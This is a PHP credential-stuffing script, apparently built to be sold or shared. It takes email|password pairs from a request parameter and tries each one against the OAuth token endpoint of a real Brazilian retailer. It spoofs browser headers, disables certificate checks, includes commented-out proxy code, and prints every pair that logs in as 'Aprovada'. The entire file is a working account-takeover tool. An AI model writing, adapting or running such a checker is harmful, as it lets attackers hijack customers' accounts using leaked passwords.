<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.2.0/css/all.css" integrity="sha384-hWVjflwFxL6sNzntih27bfxkr27PmbbK/iSvJ+a4+0owXq79v+lsFkW54bOGbiDQ" crossorigin="anonymous">

<?php
set_time_limit(0);
error_reporting(0);
date_default_timezone_set('America/Sao_Paulo');

extract($_GET);

function getStr($string,$start,$end){
	$str = explode($start,$string);
	$str = explode($end,$str[1]);
	return $str[0];
}

{
	$separador = "|";
	$e = explode("\r\n", $lista);
	$c = count($e);
	for ($i=0; $i < $c; $i++) { 
		$explode = explode($separador, $e[$i]);
		Testar(trim($explode[0]),trim($explode[1]));
	}
}
function Testar($email,$senha){
	if (file_exists(getcwd()."/amaro.txt")) {
		unlink(getcwd()."/amaro.txt");
	}
#	$ch = curl_init();
#curl_setopt($ch, CURLOPT_URL, 'http://localhost/proxy.php');
#curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
#curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
#$proxy = curl_exec($ch);
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL, "https://cerberus.amaro.pro/authorizationserver/oauth/token"); #URL 
	curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
	curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
	curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd()."/amaro.txt");
	curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd()."/amaro.txt");
	curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Linux; Android 9; SM-J701MT) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Mobile Safari/537.36"); #USERAGENT
	curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
	#curl_setopt($ch, CURLOPT_PROXY, $proxy);
	#curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_SOCKS4);
	curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'Host: cerberus.amaro.pro',
'sec-ch-ua: "Chromium";v="104", " Not A;Brand";v="99",',
'"Google Chrome";v="104"',
'code: 34088466',
'sec-ch-ua-mobile: ?1',
'user-agent: Mozilla/5.0 (Linux; Android 9; SM-J701MT) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Mobile Safari/537.36',
'content-type: application/x-www-form-urlencoded',
'accept: application/json',
'code-timestamp: 2022-08-28T18:12:24.211Z',
'sales-application: Web',
'sec-ch-ua-platform: "Android"',
'origin: https://amaro.com',
'accept-language: pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7'
	  
	  )); #HEADERS
	  
 	curl_setopt($ch, CURLOPT_POST, 1);
	curl_setopt($ch, CURLOPT_POSTFIELDS, 'client_id=web_app&client_secret=secret_@password_!web_(app&username='.$email.'&password='.$senha.'&grant_type=password');#POSTFILEDS
	   $resposta = curl_exec($ch);
		

	if (strpos($resposta, '"access_token"')) { #mensagem de base pra ver se esta logado
		
		
		echo "#Aprovada » $email | $senha Retorno: (00) - Conta Logada com sucesso @snowstorex";

		flush();
		ob_flush();
	}else{
		echo "#Reprovada $email Retorno: (00) - Conta nao encontrada";
		flush();
		ob_flush();
	}
}



?>